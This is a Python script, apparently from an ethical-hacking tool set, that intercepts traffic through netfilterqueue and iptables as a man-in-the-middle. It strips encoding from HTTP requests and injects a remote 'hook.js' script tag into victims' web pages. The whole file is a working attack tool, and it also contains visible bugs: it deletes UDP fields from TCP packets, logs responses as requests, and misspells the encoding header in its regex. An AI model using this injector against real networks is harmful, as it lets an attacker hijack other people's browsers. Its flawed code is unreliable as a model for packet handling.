#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
import argparse


# usable ONLY with HTTP connections
# service apache2 start - START BUILT IN WEB SERVER
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush

# echo 1 > /proc/sys/net/ipv4/ip_forward    - enables ip forwarding


def set_load(packet, load):
    packet[scapy.Raw].load = load

    # remove chksum & len to maintain packet integrity (will be recalculated automatically by scapy)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            print("[+] Request")
            # remove encoding from the request, so that server sends unencoded HTML
            load = re.sub("Accept encoding:.*?\\r\\n", "", load)
            new_packet = set_load(scapy_packet, load)

            # set payload to the initial packet
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            print("[+] Request")
            # code to be injected in the webpage
            injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
            # injection taking place
            load = load.replace("</body>", injection_code + "</body>")

            # modifying Content-Length attribute to include injected code
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        # modify packet
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


def get_arguments():
    parser = argparse.ArgumentParser(
        prog='code_injector',
        description="Used for injecting potentially malicious code into a target webpage",
        epilog='Part of EthicalHackingTools.'
    )

    parser.add_argument("-s", "--https", dest="https", action="store_true",
                        help="Toggle if used against http or https target. To be used with bettercap's hstshijack.")

    options = parser.parse_args()
    return options


arguments = get_arguments()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
